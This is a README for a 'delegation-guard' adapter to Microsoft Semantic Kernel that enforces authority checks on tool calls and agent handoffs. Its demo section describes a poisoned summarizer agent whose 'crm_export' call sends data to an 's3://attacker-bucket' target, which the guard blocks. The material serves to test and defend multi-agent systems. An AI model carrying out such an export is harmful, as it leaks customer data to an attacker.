# delegation-guard × Microsoft Semantic Kernel

Tested against **semantic-kernel 1.36.0** (MIT, Python ≥ 3.10) on Python 3.12.

## What it hooks

`attach_guard(kernel, agent_name=..., chain=..., policies=...)` registers two kernel filters:

- **Tool invocation** — `FilterTypes.FUNCTION_INVOCATION`. `KernelFunction.invoke` wraps
  `_invoke_internal` in the filter stack (`functions/kernel_function.py:271-275`), so returning
  without `await next(context)` provably stops the body. Covers the LLM's auto-tool-calling loop
  *and* direct `kernel.invoke(...)`.
- **Delegation / handoff** — `FilterTypes.AUTO_FUNCTION_INVOCATION`, run by
  `Kernel.invoke_function_call` (`kernel.py:437-441`) for the `Handoff-transfer_to_<Target>`
  function `HandoffOrchestration` mints per edge (`agents/orchestration/handoffs.py:190-221`).
  That is where the child's `Guard` is minted. Semantic Kernel uses the same slot for its own
  handoff bookkeeping (`handoffs.py:222`), so this is the framework's idiom.

## Run it

```bash
python examples/integrations/semantic_kernel/demo.py     # no API key needed
python -m pytest tests/integrations/test_semantic_kernel.py
```

## What you'll see

A real `HandoffOrchestration` on the `InProcessRuntime`, driven by a scripted
`ChatCompletionClientBase`. **Control:** with no Guard, the poisoned summarizer's
`crm_export("s3://attacker-bucket/…")` succeeds. **Guarded:** `crm_query(4200)` runs,
the export is denied *before the tool body*, `chain.revoke("Summarizer")` then denies even
the read, child ⊆ parent holds structurally, and the hash-chained audit log verifies.

## Two traps the adapter is built around

`HandoffAgentActor` runs `agent.kernel.clone()` (`handoffs.py:175`) and `Kernel.clone()`
**deepcopies** the plugin *and* filter lists (`kernel.py:547-555`). So filters must be
**closures, not callable objects** (a callable object's `Guard` is forked, and `revoke()`
would never reach the running agent), and enforcement state must **never live in a plugin
instance** (deep-copied per actor, so in-plugin counters and budgets are defeated).

Also: `Kernel.invoke(...)` re-raises everything as `KernelInvokeException(...) from exc`
(`kernel.py:206-213`) — use `authority_denial(exc)` to unwrap the `Decision`.
